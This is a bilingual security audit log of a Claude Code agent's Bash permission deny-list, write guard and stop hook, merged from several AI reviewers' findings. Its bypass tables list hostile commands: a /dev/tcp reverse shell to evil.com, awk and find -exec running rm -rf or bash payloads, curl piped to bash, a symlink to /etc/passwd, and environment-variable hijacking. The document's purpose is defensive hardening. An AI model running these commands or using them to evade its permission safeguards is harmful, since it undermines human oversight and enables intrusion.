Considere: threat surface cobertura; declarative vs imperative; falha silenciosa (KBP-26 em OLMO — tem equivalente em ADK?); sandbox OS-level vs prefix-match.

(2) OBSERVABILITY — OLMO StopFailure + stop-quality.sh + HANDOFF.md manual vs ADK event-driven callbacks + built-in tracing + Cloud Run/GKE deploy
| Aspect | OLMO | ADK | Trade-off |
Considere: declarative (markdown files, hook logs) vs programmatic (SDK hooks, cloud consoles); consumer vs enterprise; offline vs cloud-native; auditability.

(3) FRONTEND DESIGN TOKENS — OLMO OKLCH manual + @property + APCA contrast vs Material Design 3 dynamic color + HCT color space
| Aspect | OLMO | Material 3 | Trade-off |
Questão crítica: Material 3 usa OKLCH ou HCT (Hue Chroma Tone, Google-specific)? @property adoption em Material Web? Generator-from-seed (Material 3 style) vs handcrafted palette (OLMO) — escala design quality com team size?

(4) ORCHESTRATION — OLMO Claude Code subagents + skills + CLAUDE.md routing vs ADK Workflow agents (Sequential/Loop/Parallel) + A2A Protocol v1.2
| Aspect | OLMO | ADK | Trade-off |
Considere: grafo explícito vs implícito (via CLAUDE.md); sem-grafo é simplicidade ou limitação para pipelines longos; A2A Protocol permitiria OLMO receber tasks de Salesforce/ServiceNow — útil para consumer solo ou overkill?

Restrições absolutas:
- Read-only, no modifications, no code
- Não acesse files locais do OLMO — eu colei context necessário acima
- Seja objetivo. Sem marketing Google. Sem marketing Claude. Aponte limitações de ambos honestamente.
- Se não souber alguma coisa (ex: Material 3 usa OKLCH?), diga "unknown" em vez de inventar.
- 600 palavras max total, incluindo tabelas

Output no chat. Sem arquivos.
```

---

## Findings (preencher pós-audit)

_(Lucas cola retornos aqui; consolidação em severity table.)_

### Claude.ai output — RETURNED 2026-04-23

**Preservação:** `.claude-tmp/adversarial-claude-ai-output.md` (full text, ~2k palavras).

**Key findings (4 parts + 6 bypasses concretos):**

**Taxonomy completeness — 5 classes ausentes:**
- **A. Interpretadores com syscall embutida** (awk, find -exec, xargs, make, git filter-*, sed e, vim -c, ssh cmd, ansible, docker run sh) → **DENY-2 alargado** renomeando para "execução de código arbitrário passado como argumento"
- **B. Escalation-via-env** (PATH/LD_PRELOAD/PYTHONPATH/NODE_OPTIONS hijack) → **DENY-5 nova: "Manipulação de ambiente de execução"**
- **C. File-descriptor/network redirect** (`exec 3<>/dev/tcp/*` reverse shell bash puro zero binário) → **DENY-6 nova: "Rede raw sem binário"**. CRITICAL.
- **D. Resource exhaustion** (fork bomb, yes > /dev/full) → Absorção em DENY-1
- **E. Symlink/TOCTOU** (ln -sf /etc/passwd .claude/plans/note.md) → **DENY-3 renomeado "indirection de resolução"** + realpath check no guard

**Critério meta:** absorver quando semântica compartilhada (indirection), fragmentar quando semântica genuinamente nova (env var é estado, não comando).

**Velocity risk:** P(≥1 bug cascading) ≈ 62% sob independência; correlação real em 3 commits tocando settings.json. **Commit #1 risk: `36feffe`** (primeira aplicação ADR, KBP-26 dependency, guard matcher needs verification). **Commit #2 risk: `7e205a3`** (set -euo pipefail contradiz exit 0; `. hook-log.sh` failing → set -e abort antes do exit 0).

**Observability paradox — solução proposta:**
```bash
# Remove set -e. Sentinel touch antes de qualquer lógica.
SENTINEL="${CLAUDE_PROJECT_DIR:-$(pwd)}/.claude/stop-failure-sentinel"
{ date -u +%Y-%m-%dT%H:%M:%SZ > "$SENTINEL"; } 2>/dev/null || true
# ... cada linha depois com || true
exit 0
```
Furo real: autor copiou idiom build-script (fail-fast) pra hook observability (fail-complete). Semânticas opostas.

**6 bypasses concretos (severity):**
| # | Comando | Severity |
|---|---|---|
| 1 | `exec 3<>/dev/tcp/evil.com/4242; cat <&3` | **CRITICAL** |
| 2 | `awk 'BEGIN{system("rm -rf .claude")}'` | HIGH |
| 3 | `find . -exec bash -c 'payload' \;` | HIGH |
| 4 | `ln -sf /etc/passwd .claude/plans/note.md && cat ...` | HIGH |
| 5 | `PYTHONPATH=/tmp/evil python legit.py` | HIGH |
| 6 | `bash<TAB>-c 'rm -rf x'` | MED |

**Meta-finding:** prefix-glob assume atacante usa whitespace normal, sem re-ordering, sem env leading, sem interpreter com syscall. Atacante (ou prompt injection) não tem essa restrição. Glob insuficiente; validação robusta exige tokenização. ADR-0006 certo em mover proteção pra guard, mas guard precisa ser mais que `grep -qE '\bcp\b'`.

### Spot-check KBP-32 (guard expansão)

Claude.ai alegou "guard foi expandido" sem Read access → spot-check obrigatório (KBP-32).

**Grep em `.claude/hooks/guard-bash-write.sh` (S242, 2026-04-23):**

| Pattern claim | Encontrado | Linha |
|---|---|---|
| sed -i | ✅ | 42 |
| tee | ✅ | 48 |
| cp/mv/install/rsync | ✅ | 84 |
| touch | ✅ | 108 |
| **ln** (bonus — symlink!) | ✅ | 120 |
| rm/rmdir | ✅ | 140 |
| chmod/chown | ✅ | 151 |
| truncate | ✅ | 157 |
| patch | ❌ | — (lacuna real) |

**Veredicto:** 8/9 patterns cobertos. Claim Opus externo verificado (não foi hallucination; KBP-32 passou empiricamente). `ln` detectado é bonus que mitiga parcialmente Finding #4 (symlink TOCTOU) — mas guard apenas ASK sem realpath validation, e ASK depende de KBP-26 não degradado. Finding #4 permanece HIGH, mas severity ajustável para MED se realpath check for adicionado.

**Gap real:** `patch` não detectado. Adicionar ao guard ou retornar ao deny?

### Codex Batch A v2 (security) — RETURNED 2026-04-23 (general-purpose, 8.6min)

**Preservação:** `.claude-tmp/audit-batch-a-v2.md` (full tables). Original Codex A superseded.

**Metodologia:** Read/Grep direto com KBP-32 spot-check — cada bypass verificado antes de classificar.

**Severity final:** 0 CRITICAL, 7 HIGH, 5 MED, 1 LOW.

**Correção de Opus externo:** `exec 3<>/dev/tcp/...` é **BLOQUEADO** por `Bash(exec *)` em linha 104 de settings.json. Claude.ai CRITICAL classification incorreta — confirmada.

**HIGH findings novos (F17-F23):**
- **B-01/S-01:** `/bin/bash -c`, `/bin/sh -c` (absolute path — prefix `Bash(bash -c*)` não casa com `/bin/bash`)
- **B-02/F-01:** `curl ... | bash` (curl sem `-o` passa DENY-4; pipe não é prefix de Bash(sh*))
- **B-03/S-04:** `xargs bash -c 'payload'` (comando começa com `xargs`, não `bash`)
- **B-04:** `find . -exec bash -c 'payload' \;` (`find * -delete*` só cobre `-delete`, não `-exec`)
- **B-06:** `env bash -c 'payload'` (começa com `env`)
- **B-07/S-02:** `pwsh -c '...'` e `cmd.exe /c` — **Windows-specific HIGH**; pwsh sempre disponível em Windows 11
- **B-08:** `python -Ic 'os.system(...)'` — combined `-Ic` escapa deny `-c *` (espaço-dependente) E guard Pattern 7

**MED confirmado:** `patch` ausente do deny (removido em 36feffe) E ausente do guard (nenhum Pattern cobre).

**Meta-finding:** 7 bypasses HIGH confirmam estrutural F08 (prefix-glob insuficiente). Path forward: (a) deny expansion ad hoc OR (b) guard tokenization.

### Codex Batch B v2 (hook) — RETURNED 2026-04-23 (general-purpose, 7.9min)

**Preservação:** `.claude-tmp/audit-batch-b-v2.md` (8 bugs by line). Original Codex B superseded.

**Verdict:** **hook NÃO production-ready** — 0 CRITICAL, 3 HIGH, 4 MED, 1 LOW-MED.

**Confirmação Opus externo:** CONFIRMED com reforço. Paradoxo `set -euo pipefail` + `exit 0` é real, com **evidência linha-por-linha**. Refinement: sentinel deve usar `>>` (append) em vez de `>` (rewrite) para preservar histórico de falhas consecutivas (F32).

**8 bugs stop-failure-log.sh:**
- **B1 (HIGH, L2):** `set -euo pipefail` — abort silencioso antes de `exit 0` (paradoxo central F05)
- **B2 (HIGH, L10):** `git rev-parse` fallback para `pwd` em `/tmp` → source de path inexistente → abort (F24)
- **B3 (HIGH, L12):** `. hook-log.sh` — se missing, `source` retorna 1 → `set -e` dispara. **Hook morre 100% silenciosamente em fresh deploy** (F25)
- **B4 (MED, L20-22):** jq pipeline com pipefail — input malformado → `|| echo "unknown"` dentro de `$()` não salva parent shell (F26)
- **B5 (MED, L11):** Guard `.claude` com `exit 1` viola "sempre exit 0" (F27)
- **B6 (MED, L22):** `grep -oP` sem detecção de PCRE — falha em BusyBox/macOS (F30)
- **B7 (MED, L26):** `$REASON` não escapado para JSON — aspas/backslash/newline corrompem JSONL. **Crítico em Windows** (F28)
- **B8 (LOW-MED, L15):** stdin fechado retorna vazio, não `"{}"` — jq parse error downstream (F29)

**Abort sequence em ordem de probabilidade:** L12 → L10 → L20-22 → L26.

**statusMessage UX:** Stop[0]/Stop[1] config correta (seconds para type prompt/agent). Único gap: **StopFailure sem statusMessage** → último Stop[0] statusMessage fica stuck na UI após falha. Adicionar `statusMessage` no bloco StopFailure (F31).

**7 broken cases não cobertos:** SIGKILL, parent crash, autocompact thrash, MCP Task timeout, flock contention, Windows CRLF, hook-log.sh inacessível.

### Codex Batch C (frontend) — RETURNED 2026-04-23

**Preservação:** `.claude-tmp/codex-audit-batch-c.md` (141 li).

**Key findings:**

- **0 syntax bugs.** 6 @property blocks spec-valid per CSS Properties and Values L1 + Color 4. `syntax: "<color>"` aceita oklch() em initial-value; values matching `:root` canonical declarations (linhas 146-200 de reference.css) exatas.
- **0 usos em animation para os 6 tokens.** Shared-v2 motion em `transitions.css:25-57` é opacity/translate-driven. Legacy pulse em `base.css:582-592` é opacity/transform. Nenhum `@keyframes`, CSS transition ou WAAPI `animate()` call toca os 6 tokens registrados. **PoC é aspiracional — dead code para animation hoje.**
- **Valores idênticos entre @property initial-value e :root declarations.** Risco real não é parser invalidity; é **drift manual de sync** entre os dois lugares se um for editado sem o outro.
- **Browser matrix:** v1 `base.css:132-182` tem `@supports not (color: oklch(...))` fallback concreto; **shared-v2 NÃO tem fallback equivalente** (assume modern color). Em browser sem @property: rules ignoradas mas custom properties planas continuam funcionando via cascade. Em browser sem oklch(): shared-v2 quebra silenciosamente.
- **Duplicação conceptual 3 loci:** v1 (`base.css` accent/success/warning/danger) + v2 raw (`reference.css`) + bridge (`metanalise/shared-bridge.css`). Um semantic family existe em 3 places, com valores materialmente diferentes.
- **Adoção produção narrow:** shared-v2 imports apenas em mocks (`_mocks/hero.html`, `_mocks/evidence.html`) + 1 bridge import em `metanalise/metanalise.css:8`. Bridge usa literais copiados, não @property registrations.

**Veredicto:** PoC genuine (registrations valid + WAAPI-compatible), mas dead code em live slideware. **Hold em 6 registrations. Não expandir. Gate futura expansão em 1 slide não-mock com typed-color animation real.**

**Código @keyframes example provisto (danger→success pulse) — reference.css ready.**

### Gemini output — RETURNED 2026-04-23

**Preservação:** `.claude-tmp/adversarial-gemini-output.md` (tabelas 4 dimensões).

**Key findings:**

**Security:** OLMO deny-list falha por **omissão** (permite + esquece). ADK whitelist falha **fechada** (paralisa pipeline mas seguro). OLMO tem KBP-26 (ask→allow degradation silenciosa) — ADK não tem equivalente documentado (geralmente fail-closed nativo).

**Observability:** OLMO = declarative+offline+portátil mas auditoria manual/não escalável. ADK = event-driven callbacks + Cloud Trace, mas vendor lock-in + egress cost + dependência de rede. **Trade-off:** OLMO preserva privacidade médica (zero egress). ADK visualiza degradação de agentes ao longo do tempo (OLMO carece).

**Frontend tokens (importante):** **Material 3 NÃO usa OKLCH — usa HCT (Hue, Chroma, Tone) focado em acessibilidade automatizada**. OKLCH oferece precisão perceptual ao designer. OLMO handcrafted extrai performance máxima (projetor 1080p); M3 generator-from-seed garante consistência mas estética genérica. **Escalabilidade:** OLMO paleta artesanal escala mal com team size; M3 independe do designer. **Adoção de @property pelo Material Web: unknown.**

**Orchestration:** **A2A Protocol é overkill absoluto para OLMO hoje** (médico solo, síntese clínica offline). OLMO grafo implícito flexível mas propenso a loops/amnésia em pipelines longos. ADK força determinismo.

### Consolidated severity table (parcial — 2/3 Codex pending)

| # | Finding | Source | Commit alvo | Severity | Decisão prelim |
|---|---|---|---|---|---|
| F01 | Reverse shell via `/dev/tcp/*` — zero binário, bypassa DENY-4 | Claude.ai Part 4 #1 | `36feffe` / ADR-0006 | **CRITICAL** | **Accept** — proposta: DENY-6 nova (patterns `Bash(*/dev/tcp/*)`, `Bash(*/dev/udp/*)`) |
| F02 | Env var hijacking (PYTHONPATH/LD_PRELOAD/NODE_OPTIONS) | Claude.ai Part 4 #5 + Part 1 B | `36feffe` / ADR-0006 | HIGH | **Accept** — proposta: DENY-5 nova (patterns `Bash(*LD_PRELOAD=*)`, `Bash(*PYTHONPATH=*)`, `Bash(*NODE_OPTIONS=*)`, `Bash(*PATH=*)` ASK) |
| F03 | awk/find-exec/xargs/make bypassam DENY-2 (sem -c flag) | Claude.ai Part 4 #2-3 + Part 1 A | ADR-0006 | HIGH | **Accept** — alargar DENY-2 (semântica "código arbitrário como argumento") |
| F04 | Symlink TOCTOU — ln já detectado pelo guard mas sem realpath check | Claude.ai Part 4 #4 + spot-check | guard-bash-write.sh | MED-HIGH | **Accept** — adicionar realpath validation no Pattern 14 |
| F05 | StopFailure `set -euo pipefail` vs `exit 0` semânticas opostas | Claude.ai Part 2 + Part 3 | `7e205a3` | MED-HIGH | **Accept** — remover set -e, sentinel touch antes de lógica, `\|\| true` per linha |
| F06 | Observability recursion — silent death em lib missing | Claude.ai Part 3 | `7e205a3` | MED | **Accept** — sentinel file approach resolve F05+F06 |
| F07 | `patch` removido do deny E não coberto pelo guard | Spot-check S242 (Grep guard) | `36feffe` / guard | MED | **Accept** — add pattern no guard OR retornar a deny |
| F08 | Prefix-glob insuficiente (tab bypass, quoting tricks, brace expansion) | Claude.ai Part 4 #6 + meta-finding | ADR-0006 + runtime CC | LOW-MED | **Defer** — requer mudança runtime Anthropic ou tokenizer no guard |
| F09 | Fork bomb não coberto (resource exhaustion) | Claude.ai Part 1 D | ADR-0006 | LOW (single-user) | **Accept** — nota em DENY-1 descrição estendida |
| F10 | ADK whitelist > OLMO deny-list em threat coverage; OLMO wins em fricção + privacidade | Gemini (1) | Arquitetural | INFO | **Info** — confirma trade-off ADR-0006; não muda decisão |
| F11 | ADK observability tracing resolve degradação-ao-longo-do-tempo (OLMO carece) | Gemini (2) | stop-quality.sh + pending-fixes.md | INFO | **Consider** — Langfuse MCP wrapper (já em S241 DEFERRED EVAL-next) |
| F12 | Material 3 usa HCT, não OKLCH. OKLCH escolha válida (perceptual precision) | Gemini (3) | base.css / @property | INFO | **Info** — sem mudança; OKLCH confirmed correto pra OLMO use case |
| F13 | A2A Protocol overkill pra OLMO solo | Gemini (4) | Orquestração | INFO | **Info** — confirma IGNORE em S241 matriz |
| F14 | @property PoC spec-valid mas 0 usos em animation (dead code live) | Codex C | `e5cf330` | LOW-MED | **Hold** — não expandir; gate em consumer real |
| F15 | Manual sync drift risk entre `initial-value` e `:root` declarations | Codex C | `e5cf330` | LOW | **Consider** — lint rule ou comment canonical locus |
| F16 | Duplicação conceptual 3 loci (v1 base.css + v2 reference.css + bridge) | Codex C | Architectural | MED | **Accept** — ADR decision point para shared-v2 migration posture |
| --- | _Codex A + B findings pending_ | --- | --- | --- | --- |

---

## Verification (como saber que audit foi thorough)

1. **Cobertura vendor:** 3 modelos distintos (Anthropic externo + OpenAI Codex + Google Gemini) atacaram o mesmo target set com frames diferentes → KBP-28 (frame-bound) mitigado empiricamente.
2. **Severity distribution:** se 0 CRITICAL + 0 HIGH findings, audit é confirmatório (S241 ships eram sólidos) → registrar em ADR-0006 addendum como "validated externally S242". Se ≥1 CRITICAL, criar backlog items + possível revert/patch.
3. **Findings novidade:** findings que NÃO apareceram em S241 SOTA research (Anthropic/Competitors/Frontend agents) → evidence de valor da rodada adversarial vs self-audit.
4. **Consolidation time:** Lucas retornar outputs em < 24h; consolidation + commits < 2h de Claude Code time.

---

## Session artifacts (criar pós-approval)

- `.claude/.session-name` = `adversarial-round` (statusline)
- `.claude-tmp/codex-audit-batch-a.md` (Codex output)
- `.claude-tmp/codex-audit-batch-b.md` (Codex output)
- `.claude-tmp/codex-audit-batch-c.md` (Codex output)
- HANDOFF update: S242 findings + next steps
- CHANGELOG update: 1 linha "S242 adversarial round: N findings (X CRITICAL, Y HIGH, Z MED, W LOW)"
- Possível: ADR-0006 addendum se findings ≥ HIGH; ADR-0007 se nova categoria DENY-5 emergir; backlog items em .claude/BACKLOG.md

---

## Out-of-scope S242

- Implementação de fixes (espera batch consolidation primeiro)
- Expansão deny-list (só após ADR addendum)
- @property expansion para tokens não solid★ (separado — EVAL-next da matriz SOTA)
- Trilha A (metanalise C5) + Trilha B (infra DEFERRED) — paused até adversarial close

Coautoria: Lucas + Opus 4.7 (Claude Code) | S242 adversarial-round | 2026-04-23
